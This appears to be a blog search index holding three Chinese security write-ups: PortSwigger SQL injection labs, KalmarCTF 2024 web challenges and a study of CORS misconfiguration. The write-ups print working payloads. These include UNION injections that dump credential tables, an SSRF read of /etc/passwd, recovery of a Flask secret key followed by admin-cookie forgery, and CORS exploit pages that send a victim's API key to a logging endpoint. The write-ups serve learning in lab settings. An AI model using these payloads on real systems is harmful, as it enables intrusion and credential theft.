<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bp-sql</title>
    <url>/2024/07/07/Bp-sql/</url>
    <content><![CDATA[SQL注入备忘单
Lab：WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据此实验室在产品类别过滤器中包含 SQL 注入漏洞。当用户选择一个类别时，应用程序将执行如下 SQL 查询：
SELECT * FROM products WHERE category = &#x27;Gifts&#x27; AND released = 1

要完成该实验，请执行 SQL 注入攻击，导致应用程序显示一个或多个未发布的产品。

当我们进入环境之后，选择其中一个类别后，会自动给我们进行筛选然后仅显示出我们选择的类别中我们所能看到的东西
查询的sql语句如上所示
因此我们输入的payload为：/filter?category=Gifts&#39; or 1=1--+
Lab：允许绕过登录的 SQL 注入漏洞本实验的登录函数中存在 SQL 注入漏洞。要完成该实验，请执行 SQL 注入攻击，以 administrator 用户身份登录到应用程序。

进入环境的登陆界面，随便输入用户名和密码并抓包，如下：

从题目中我们已知管理员的账户名，但是不知道密码
因此我们可以在输入账号名的地方将剩下的sql语句全部注释掉，这样就不会验证到密码，密码可以随便填
输入账号：administrator&#39;#，被拦截
换一个注释符：administrator&#39;--+，成功
Lab：SQL注入攻击，查询Oracle上的数据库类型和版本此实验室在产品类别过滤器中包含 SQL 注入漏洞。您可以使用 UNION 攻击来检索注入查询的结果。要解决该实验，请显示数据库版本字符串

Oracle 上有一个名为 dual 的内置表，我们可以通过该表来实现目的
首先我们测试出为单引号包裹
再通过：/filter?category=Clothing%2c+shoes+and+accessories&#39; orderby 2--+判断出回显两个字段
继续：/filter?category=Clothing%2c+shoes+and+accessories&#39; union select &#39;abc&#39;,&#39;def&#39; from dual--+(Oracle默认是字符串)
查询资料得知要查看Oracle的版本号的语句为：select banner from v$version
由于要回显两个字段，所以第二个字段设为null
因此完整的注入语句为：/filter?category=Clothing%2c+shoes+and+accessories&#39; union select banner,null from v$version--+
成功回显出版本号，题目解决
Lab：SQL注入攻击，查询MySQL和Microsoft的数据库类型和版本此实验室在产品类别过滤器中包含 SQL 注入漏洞。您可以使用 UNION 攻击来检索注入查询的结果。
要解决该实验，请显示数据库版本字符串。

测试一下为单引号包裹，回显两个字段
所以注入：/filter?category=Gifts&#39; union select @@version,null--+
页面末尾回显版本号，题目解决
Lab：SQL注入攻击，列出非Oracle数据库上的数据库内容此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。该应用程序具有登录功能，数据库包含一个保存用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容以获得所有用户的用户名和密码。要完成实验，请以 administrator 用户身份登录。

首先拦截并修改设置产品类别过滤器的请求
测试出单引号包裹，回显两个字段，union注入启动
要注意Oracle数据库和mysql数据库还是有点不一样的
首先测出所有的表：?category=Gifts&#39;union select table_name,null from information_schema.tables--+
然后检索一下发现我们所需的表名为users_accvfs
接着测出该表的所有字段：?category=Gifts&#39;union select column_name,null from information_schema.columns where table_name=&#39;users_accvfs&#39;--+
得到我们所需的两个字段名，爆出其内容：?category=Gifts&#39;union select username_tvjrcf,password_lyiaeg from users_accvfs--+
得到管理员的密码

登录账号，题目解决
Lab：SQL注入攻击，列出Oracle上的数据库内容此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。
该应用程序具有登录功能，数据库包含一个保存用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容以获得所有用户的用户名和密码。要完成实验，请以 administrator 用户身份登录

要注意：在 Oracle 数据库上，每个 SELECT 语句必须指定一个表来选择 FROM 。如果您的 UNION SELECT 攻击不从表中查询，您仍然需要包含 FROM 关键字，后跟有效的表名称；Oracle数据库中有一个内置表dual
由于是查看Oracle数据库中的内容，所以我们要遵循其语法规范
首先获取到所有的表：?category=Gifts&#39;union select table_name,null from all_tables--+
得到我们所需的表后爆出所有的字段：?category=Gifts&#39;union select column_name,null from all_tab_columns where table_name=&#39;USERS_FSFWLB&#39;--+
获取到了两个我们需要的字段名，接着爆出其内容：?category=Gifts&#39;union select USERNAME_MIGUZK,PASSWORD_OAVFCV from USERS_FSFWLB--+
获取到管理员的密码
登录上去，题目解决
Lab：SQL注入UNION攻击，确定查询返回的列数此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。此类攻击的第一步是确定查询返回的列数。然后，您将在后续实验中使用此技术来构建完整的攻击。要完成该实验，请通过执行 SQL 注入 UNION 攻击（返回包含空值的附加行）来确定查询返回的列数。

就是确定回显的列数而已
要注意的是后面是要：&#39;union select null,null,null--+&#39;，需要的是null
Lab：SQL 注入 UNION 攻击，查找包含文本的列此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。要构建此类攻击，您首先需要确定查询返回的列数。您可以使用在之前的实验室中学到的技术来完成此操作。下一步是识别与字符串数据兼容的列。实验室将提供您需要使其出现在查询结果中的随机值。要完成该实验，请执行 SQL 注入 UNION 攻击，该攻击返回包含所提供值的附加行。此技术可帮助您确定哪些列与字符串数据兼容。

单引号包裹，回显列数为3
开始确定哪列可以与字符串数据兼容：?category=Pets&#39;union select null,&#39;waWdyd&#39;,null--+
测出是第二列，题目解决
Lab：SQL注入UNION攻击，从其他表检索数据此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。要构建此类攻击，您需要结合在之前的实验中学到的一些技术。该数据库包含一个名为 users 的不同表，其中包含名为 username 和 password 的列。要完成该实验，请执行 SQL 注入 UNION 攻击，检索所有用户名和密码，并使用该信息以 administrator 用户身份登录。

上面几题综合一下而已，没其他情况
Lab：SQL 注入 UNION 攻击，检索单个列中的多个值此实验室在产品类别过滤器中包含 SQL 注入漏洞。查询的结果将在应用程序的响应中返回，因此您可以使用 UNION 攻击从其他表中检索数据。该数据库包含一个名为 users 的不同表，其中包含名为 username 和 password 的列。要完成该实验，请执行 SQL 注入 UNION 攻击，检索所有用户名和密码，并使用该信息以 administrator 用户身份登录。

重点：?category=Pets&#39;union select null,concat(username,password) from users--+
一次回显两个字段
得到所需密码，题目解决
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>KalmarCTF 2024 Web Challenges</title>
    <url>/2024/03/21/KalmarCTF-2024-Web-Challenges/</url>
    <content><![CDATA[Ez ⛳ v2按照题解中所讲下面这段代码比较重要
ua.caddy.chal-kalmarc.tf &#123;tls internaltemplatesimport html_reply `User-Agent: &#123;&#123;.Req.Header.Get  &quot;User-Agent&quot;&#125;&#125;`&#125;http.caddy.chal-kalmarc.tf &#123;tls internaltemplatesimport html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;&#125;

发现User-Agent处有可能是存在模板注入的，所以我们去试验一下 &#123;&#123;7&#125;&#125;，会回显，但是输入其他的比如 &#123;&#123;7*7&#125;&#125;的时候会返回500，这时候便应该去查官方的相关文档（做题时完全没有意识到这点）：https://caddyserver.com/docs/modules/http.handlers.templates#docs
查看的时候会发现两个提别有意思的语句，如下：

这两个函数都可以呈现出文件中的内容，我们可以试验 readFlile &quot;/etc/passwd&quot;，回显内容

以上这个函数可以用来显示目录下面的文件，所以我们输入命令 &#123;&#123;listFiles "/"&#125;&#125;，根目录下文件显示出来，然后利用可以读取文件的那两个方法来读取flag文件，得到我们所需的flag
Is It Down该题是输入一个url后可以对该url进行一个check，是一个明显的ssrf，但是输入的网址要求必须是https开头，但是我们可以通过构造自己的https网址，从那里重定向到http网址去，相关的php代码如下：
&lt;?phpheader(&quot;Location: &quot;.$_GET[&#x27;x&#x27;]);?&gt;

由于是个明显的ssrf漏洞，我们尝试通过file伪协议来读取本地文件：https://ctf.hijwei.top/?wells=file:///etc/passwd，成功读取
我们可以用 /proc来进行读取相关内容，/proc是一个虚拟的文件系统，关于它的一些基础用法可以访问该网址：https://blog.csdn.net/cosmoslin/article/details/122660083
我们开始使用

可以看到响应的内容里面有个uwsgi，通过搜索可知这跟python起个服务有关，说明该题的后端语言是python，内容的后半部分是所属的配置文件，我们直接访问（由于做的题目都是docker里面起的服务，所以进程号都是1，self可以改为1）

然后我们可以进行顺藤摸瓜访问其后端文件

我们整理一下，变回flask的代码，如下：
from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocessimport osdef protect_secrets():    os.unlink(&quot;config.py&quot;)def check_url(url):    if not isinstance(url, str) or len(url) == 0:        return False, &quot;Please provide a regular url!&quot;    if not url.startswith(&quot;https://&quot;) or url.lstrip() != url:        return False, &quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;    return True, &quot;&quot;app = Flask(__name__, static_folder=&#x27;static&#x27;, static_url_path=&#x27;/assets/&#x27;)app.secret_key = session_encryption_keyprint(&quot;Using key:&quot;, app.secret_key)protect_secrets()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def home():    return send_from_directory(&#x27;pages&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True:        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)@app.route(&#x27;/check&#x27;, methods=[&#x27;POST&#x27;])def check():    url = request.form.get(&quot;url&quot;)    valid, err = check_url(url)    if not valid:        return &#123;            &#x27;success&#x27;: False,            &#x27;error&#x27;: err        &#125;    if True:        content = fetch(url)        return &#123;            &#x27;success&#x27;: True,            &#x27;online&#x27;: content != None,            &#x27;content&#x27;: content        &#125;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=10600, debug=False)

其中最引人瞩目的便是下面这块子路由为 /flag的代码
@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True:        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)

需要 /flag 访问 admin 设置 True ，这意味着我们需要泄漏 session_encryption_key 值，但是仔细看代码会发现代码在这之前会执行一个函数将 config.py文件删除掉，导致我们的方法不会成功，题解中告诉我们在Python工作目录下，如果执行某文件后经常会自动生成一个__pycache__文件夹，就是python的缓存文件夹
举个例子，如果执行的是python ./demo.py，就会生成demo.cpython-39.pyc文件，后面的39是python版本号并去掉了小数点，该题的python 版本号是3.11（可以通过前面抓包访问的配置文件回显的内容发现），题解告诉了我们这种文件存储的路径是 /var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc，所以我们开始尝试

回显了一大串16进制的数据，我们将它转化为2进制的数据，这是逆向工程，以下脚本可以帮助到你
data_str =&quot;\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00&quot;#将字符串里面的转义序列转化为相应的二进制数据binary_data = bytes(data_str, &quot;utf-8&quot;).decode(&quot;unicode_escape&quot;).encode(&quot;latin1&quot;)#保存到文件中with open(&quot;output_binary_data.txt&quot;, &quot;wb&quot;) as file:    file.write(binary_data)print(&quot;Success&quot;)

将文件后缀名命名为 .pyc，然后上网找个在线pyc文件反编译的网站用一下，得到以下结果：
# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.11session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;

然后使用工具伪造一个属于我们自己的cookie，这边用的是 Flask Unsign，可以在github上面安装，命令如下：
$ pip3 install flask-unsign[wordlist]

伪造cookie：
flask-unsign --sign --cookie &quot;&#123;&#x27;admin&#x27;: True&#125;&quot; --secret &quot;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&quot;

将得到的session复制到cookie处，然后访问 /flag，得到flag
BadAss Server for Hypertext先用bp抓个包，尝试一下目录穿越，发现成功了

利用 /proc来进行尝试，查看cmdline目录获取启动指定进程的完整命令

访问 /../../../../../../app/badass_server.sh，获得如下代码：
#!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=&quot;200 OK&quot;abort() &#123;	declare -gA response_headers	status=&quot;400 Bad Request&quot;	write_headers	if [ ! -z $&#123;1+x&#125; ]; then		&gt;&amp;2 echo &quot;Request aborted: $1&quot;		echo -en $1	fi	exit 1&#125;write_headers() &#123;	response_headers[&#x27;Connection&#x27;]=&#x27;close&#x27;	response_headers[&#x27;X-Powered-By&#x27;]=&#x27;Bash&#x27;	echo -en &quot;HTTP/1.0 $status\r\n&quot;	for key in &quot;$&#123;!response_headers[@]&#125;&quot;; do		echo -en &quot;$&#123;key&#125;: $&#123;response_headers[$key]&#125;\r\n&quot;	done	echo -en &#x27;\r\n&#x27;	&gt;&amp;2 echo &quot;$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;) $SOCAT_PEERADDR $method $uri $protocol -&gt; $status&quot;&#125;receive_request() &#123;	read -d $&#x27;\n&#x27; -a request_line	if [ $&#123;#request_line[@]&#125; != 3 ]; then		abort &quot;Invalid request line&quot;	fi	method=$&#123;request_line[0]&#125;	uri=$&#123;request_line[1]&#125;	protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)	if [[ ! $method =~ ^(GET|HEAD)$ ]]; then		abort &quot;Invalid request method&quot;	fi	if [[ ! $uri =~ ^/ ]]; then		abort &#x27;Invalid URI&#x27;	fi	if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then		abort &#x27;Invalid protocol&#x27;	fi	while read -d $&#x27;\n&#x27; header; do		stripped_header=$(echo -n &quot;$header&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)		if [ -z &quot;$stripped_header&quot; ]; then			break;		fi		header_name=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 1 | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27;);		header_value=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 2- | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;);		if [ -z &quot;$header_name&quot; ] || [[ &quot;$header_name&quot; =~ [[:space:]] ]]; then			abort &quot;Invalid header name&quot;;		fi		# If header already exists, add value to comma separated list		if [[ -v request_headers[$header_name] ]]; then			request_headers[$header_name]=&quot;$&#123;request_headers[$header_name]&#125;, $header_value&quot;		else			request_headers[$header_name]=&quot;$header_value&quot;		fi	done	body_length=$&#123;request_headers[&quot;content-length&quot;]:-0&#125;	if [[ ! $body_length =~ ^[0-9]+$ ]]; then		abort &quot;Invalid Content-Length&quot;	fi	read -N $body_length request_body&#125;handle_request() &#123;	# Default: serve from static directory	path=&quot;/app/static$uri&quot;	path_last_character=$(echo -n &quot;$path&quot; | tail -c 1)	if [ &quot;$path_last_character&quot; == &#x27;/&#x27; ]; then		path=&quot;$&#123;path&#125;index.html&quot;	fi	if ! cat &quot;$path&quot; &gt; /dev/null; then		status=&quot;404 Not Found&quot;	else		mime_type=$(file --mime-type -b &quot;$path&quot;)		file_size=$(stat --printf=&quot;%s&quot; &quot;$path&quot;)		response_headers[&quot;Content-Type&quot;]=&quot;$mime_type&quot;		response_headers[&quot;Content-Length&quot;]=&quot;$file_size&quot;	fi	write_headers	cat &quot;$path&quot; 2&gt;&amp;1&#125;receive_requesthandle_request

我注意到以下逻辑：
1if  [  $protocol  !=  &#x27;HTTP/1.0&#x27;  ]  &amp;&amp;  [  $protocol  !=  &#x27;HTTP/1.1&#x27;  ];  then abort &#x27;Invalid protocol&#x27;  fi

This has some unquoted variables and may allow us to glob the $protocol value. I tried a basic test:这有一些未加引号的变量，可能允许我们对 $protocol 值进行全球化。我尝试了一个基本测试：
通配它应该只产生一个结果，我们得到了 Invalid Protocol ，所以我接下来尝试：
这应该产生&gt; 1 个结果（如果前面的文件是不存在的话，这次服务器的输出是错误的 cat）。测试一个应该产生 0 结果的也会给出 Invalid Protocol 了。这意味着我们有一个预言机，我们可以检测目录中是否有&gt; 1 个文件。我们想泄露包含该标志的隐藏目录（大概）。我决定最好使用正则表达式方法。我们必须创建一个与已知文件夹之一（通过查看页面源码可以确定一个已知文件名）完全匹配的正则表达式，然后我们可以暴力破解值以找到隐藏的文件夹（这样 glob 将返回 2 个文件并给我们那个 cat 错误或其他的)！工作原理如下：
/assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/[^fabcde1345678][^123457890abc][^abe][^abcdef124][^abcde1][^abcdef0134][^abdef012347][^012345678abcde][^103456789abcd][^abcdef013][^abcde01234567][^a-f0123456][^a-f0234][^b-f012345678][^ab][^678][^a][^a-f0][^134567890abcdef][^b-f01][^abdef1234567890][^a][^abcdef12340678][^b-f1][^01234568][^a-f01234][^abdef0123][^1234567890abcef][^a][^ac][^a-f02345][^a-f02345]*

最后我们可以找到隐藏的目录 9df5256fe48859c91122cb92964dbd66 ，并且可以找到位于 /assets/9df5256fe48859c91122cb92964dbd66/flag.txt中的flag
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>CORS跨域资源共享漏洞学习</title>
    <url>/2024/03/25/CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[前言想要了解明白这个漏洞，我们就需要知道一些前提
同源策略 (Same Origin Policy)
同源策略的基本原则是：当一个浏览器加载一个源（Origin）的文档或脚本时，它将只允许该文档或脚本与其自身相同源的资源进行交互，而不允许与其他源的资源进行直接交互。这种限制有助于防止恶意网站获取用户的敏感信息或进行未经授权的操作。
同源策略通常应用于以下方面：

DOM访问限制：一个源的JavaScript代码只能访问来自相同源的DOM对象，不能直接操作其他源的DOM对象。
Cookie限制：浏览器会将Cookie与其关联的源关联起来，并且在同源策略下，一个源的Cookie不会被发送到另一个源。
XHR请求限制：XMLHttpRequest对象（用于AJAX请求）在同源策略下只能向同一源发起请求。
Frame和iFrame限制：同源策略限制了页面中一个frame或iframe内加载的内容只能来自相同的源。

两个URL只有在以下所有方面都匹配时才被视为同源：

协议（Protocol）：两个URL的协议必须相同，例如都是HTTP或都是HTTPS。
主机名（Host）：两个URL的主机名（域名或IP地址）必须完全相同。
端口（Port）：如果指定了端口号，那么两个URL的端口号必须相同。如果未指定端口号，则默认使用HTTP的80端口和HTTPS的443端口

 同时满足这三种条件就是同源，当存在两个站点，其中有一项不满足相同条件的时候，我们即可说这两个站点不是同源站点，而当其中一个站点想请求另外一个站点的资源的时候我们边称它为跨域请求，而由于安全考虑，跨域请求会受到同源策略的限制
不受影响的标签
 在HTML中&lt;a&gt;, &lt;form&gt;, &lt;img&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;link&gt; 等标签以及 Ajax 都可以指向一个资源地址
 在这些标签中有以下的标签不受同源策略的限制

script
img
link
css

用户对跨域的需求

比如前后端分离的情况，前后端域名不同，但是前端会需要用到后端的接口，发送ajax请求
电商网站加载第三方快递网站的物流信息

跨域请求方式CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。

请求方法是以下三种方法之一：


HEAD
GET
POST


HTTP的头信息不超出以下几种字段：


Accept
Accept-Language
Content-Language
Last-Event-ID
Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain

简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。
浏览器对简单请求和非简单请求的处理机制不一样。对于简单请求，浏览器就会立刻发送这个请求。对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。
CORS机制解决
CORS，跨域资源共享（Cross-origin resource sharing），是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。
下图是常见的跨域会遇到的请求头
当对CORS配置不当的时候，就导致资源被恶意操作，也就发生了CORS漏洞
漏洞检测
一般情况下，修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在
常见的几种情况如上面的图所示，用红框标记的是最有代表性的三个头，其中我们可以手动为请求加上Origin，然后观察响应头的Access-Control-Allow-Origin和Access-Control-Allow-Credentials的值

其中Access-Control-Allow-Origin表示允许跨域访问的host

 就三个值，可以设置成指定的网站，也可以设置成*表示允许所有host跨域访问，也可以设置为null，但是首先设置成null并不常见，并且也不推荐

如果想跨域传输cookies,需要Access-Control-Allow-Credentials设置为true，并且需要与XMLHttpRequest.withCredentials 或Fetch API中的Request() 构造器中的credentials 选项结合使用，例如使用XMLHttpRequest的时候需要将withCredentials的值设置为true

接下来按照常见性分为几种情况



Access-Control-Allow-Origin
Access-Control-Allow-Credentials
结果



*
true
不存在漏洞


&lt;all-host&gt;&lt;/all-host&gt;
true
存在漏洞


&lt;safe_host&gt;
true
安全-不存在漏洞


null
true
存在漏洞


第一种，Allow-Origin为 * ，Allow-Credentials为 true后端代码如下：

按照上面漏洞检测的方法检测，结果如下：

前面我们知道Access-Control-Allow-Origin表示允许跨域访问的host，我们这里设置成了通配符*，代表允许所有网站的跨域请求，当这种情况的时候，即便Access-Control-Allow-Credentials为true，那么会被认定为不安全的，将不能将cookie发送到服务端，所以我们利用会失败
攻击服务器代码：index.jsp
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;         pageEncoding=&quot;UTF-8&quot;%&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!&lt;/h2&gt;    &lt;button id=&quot;attack&quot; type=&quot;button&quot; onclick=&quot;attack()&quot;&gt;点我抢红包&lt;/button&gt;&lt;/body&gt;&lt;script&gt;    function attack() &#123;         var xhttp = new XMLHttpRequest();         xhttp.onreadystatechange = function () &#123;             // 当响应请求完成，并且返回200的时候弹出响应体            if (this.readyState == 4 &amp;&amp; this.status == 200)&#123;                if(this.response ==&quot;&quot; || this.response == null)&#123;                    alert(&quot;恭喜已经绕过了同源策略，但是响应体为空，利用失败&quot;);                &#125;else&#123;                    alert(&quot;黑客已经拿到你的敏感信息----&quot;+this.response)                &#125;            &#125;        &#125;        //打开靶机地址        xhttp.open(&quot;GET&quot;,&quot;http://192.168.1.2:8080/info&quot;,true);        //使用 cookie、授权标头或 TLS 客户端证书等凭据进行跨站点请求        xhttp.withCredentials = true;        xhttp.send();    &#125;&lt;/script&gt;&lt;/html&gt;

靶机地址： 192.168.1.2:8080
攻击服务器地址：192.168.1.251:8080
当用户登录状态下，访问我们的网站并点击相关按钮的时候，发下没有任何反应，这时候我们来看一下响应体和控制台，发现请求已经被同源策略禁止了

第二种，Allow-Origin为&lt;all-host&gt; ，Allow-Credentials为 true&lt;/all-host&gt;这种的话其实也相当于同意了所有站点的跨域请求，一般如果是这种情况，那么漏洞肯定存在并且可以利用，而出现漏洞的原因就是一些开发为了图方便导致的
后端代码如下：

测试的结果如下：
这样子的话便可以利用成功

但是在正常的浏览器上面尝试的话便不会成功（所看文章的作者在虚拟机上下的一个谷歌的盗版浏览器）

原因就是SameSite属性，2016年开始，Chrome 51版本对Cookie新增了一个 SameSite属性，为了防止CSRF攻击，陆续的各大厂商的浏览器也都适配了该属性，该属性有什么用呢？如下图所示，展示了SameSite和其它跟cookie有关的设置的基本用途

samesite属性有三个值

Strict：最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。
Lax：当开发开发人员没有设置samesite的值得时候，Lax是默认值，规则稍稍放宽，大多数情况也是不发送第三方 Cookie，详细如下图


我们利用页面的请求，可以算作一个AJAX，所以当我们默认情况下去利用不会发送cookie

None：所有请求中都允许发送cookie，但是如果samesite配置成了none，还必须将cookie加上Secure属性才能够生效


所以当遇到https协议的站点，并且cookie的samesite被设置成None的时候，也可以利用，如下图所示，我将站点改成了https，并且加上了samesite&#x3D;None以及Secure


利用成功，其中当Allow-Origin设置为safe-host类似
第三种，Allow-Origin为null，Allow-Credentials为true这种情况可以被绕过，因为任何使用非分级协议（如 data: 或 file:）的资源和沙盒文件的 Origin 的序列化都被定义为‘null’，所以我们这里利用iframe标签，使用 data url 格式将src的值直接加载为html（同样的利用成功的前提仍然要考虑我们上述提到的samesite）
&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms allow-modals&quot; src=&quot;data:text/html;charset=UTF-8,&lt;script&gt;    var xhttp = new XMLHttpRequest();         xhttp.onreadystatechange = function () &#123;             // 当响应请求完成，并且返回200的时候弹出响应体            if (this.readyState == 4 &amp;&amp; this.status == 200)&#123;                if(this.responseText ==&#x27;&#x27; || this.responseText == null)&#123;                        alert(&#x27;恭喜已经绕过了同源策略，但是响应体为空，利用失败&#x27;);                        console.log(&#x27;no,&#x27;+this.responseText)                        &#125;else&#123;                        alert(&#x27;黑客已经拿到你的敏感信息----&#x27;+this.responseText);                        console.log(&#x27;yes,&#x27;+this.responseText)&#125;                        &#125;                        &#125;                    xhttp.open(&#x27;GET&#x27;,&#x27;https://192.168.1.2:8443/info&#x27;,true);                    xhttp.withCredentials = true;                    xhttp.send();    &lt;/script&gt;&quot;&gt;&lt;/iframe&gt;

利用成功

当然也可以利用h5的新属性srcdoc
&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms allow-modals&quot; srcdoc=&quot;&lt;script&gt;    var xhttp = new XMLHttpRequest();         xhttp.onreadystatechange = function () &#123;             // 当响应请求完成，并且返回200的时候弹出响应体            if (this.readyState == 4 &amp;&amp; this.status == 200)&#123;                        alert(this.responseText);                        &#125;                        &#125;                    xhttp.open(&#x27;GET&#x27;,&#x27;https://192.168.1.2:8443/info&#x27;,true);                    xhttp.withCredentials = true;                    xhttp.send();&lt;/script&gt;    &quot;&gt;&lt;/iframe&gt;

同样可以利用

实战Lab：具有基本源反射的 CORS 漏洞要求：要解决该实验问题，请制作一些使用 CORS 检索管理员的 API 密钥并将代码上传到漏洞利用服务器的 JavaScript
首先我们先开启bp，关掉拦截，打开谷歌的proxy插件，然后登录题目提供给我们的账号，成功登录后查看代理模块中的HTTP历史记录，点击/accountDetails，观察密钥是否通过对 /accountDetails 的 AJAX 请求检索，并且响应包含表明它可能支持 CORS 的 Access-Control-Allow-Credentials 标头，所以把该条目发送到重放器里面，按照上面的方法测试一下是否含有CORS漏洞，如下所示：
可以发现接受所有的链接，并且Allow-Credentials为 true，有漏洞可以利用，所以我们到bp给我们提供的漏洞利用服务器中，并在其中的html代码的body部分输入以下代码：
&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;/log?key=&#x27;+this.responseText;    &#125;;&lt;/script&gt;

对以上代码的解释：

var req = new XMLHttpRequest();：创建了一个新的 XMLHttpRequest 对象，用于发起 HTTP 请求。
req.onload = reqListener;：指定了当请求成功完成时调用的回调函数 reqListener。这意味着一旦请求成功返回数据，将会执行名为 reqListener 的函数。
req.open(&#39;get&#39;,&#39;YOUR-LAB-ID.web-security-academy.net/accountDetails&#39;,true);：使用 GET 方法打开了一个与指定 URL 的异步（true 表示异步）HTTP 连接。该 URL 是一个包含用户账户详情的资源。
req.withCredentials = true;：设置了 XMLHttpRequest 对象的 withCredentials 属性为 true。这表示在请求中会包含凭据（如 cookie、授权标头等），从而允许在跨域请求中发送身份验证信息。
req.send();：发送了 HTTP 请求到指定的 URL

保存之后便可以将其发送给受害者，然后查看日志，获取到管理员的API，题目解决
Lab：具有受信任的 null 源的 CORS 漏洞首先按照上题的方法一样检查是否有CORS漏洞，与上题不一样的是这题我们在Origin处输入任意一个链接的话响应体里面不会回显Access-Control-Allow-Origin，但是当我们输入null的时候，回显成功，如下：
回显的这两条证明了还是存在CORS漏洞的，不过需要用常见的第三种情况里面的方法，到bp给我们提供的漏洞利用服务器中，并在其中的html代码的body部分输入以下代码：
